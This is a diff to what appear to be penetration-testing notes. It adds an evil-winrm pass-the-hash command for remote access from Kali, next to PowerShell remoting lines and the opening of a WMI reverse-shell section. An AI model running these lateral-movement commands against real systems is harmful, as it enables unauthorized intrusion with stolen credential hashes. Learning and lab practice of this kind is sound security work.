@@ -65,6 +65,12 @@ New-PSSession -ComputerName 192.168.12.34 -Credential $credential
 Enter-PSsession 1
 ```
 
+### evil-winrm
+The same thing but from Kali, and passing the hash instead of password:
+```bash
+evil-winrm -i 172.16.xx.xx -u chump -H <chumps NT hash>
+```
+
 ### WMI
 If for some reason we cannot use WinRM, or if we'd rather have a reverse shell from Kali, then worth trying WMI as an alternative:
 ```powershell
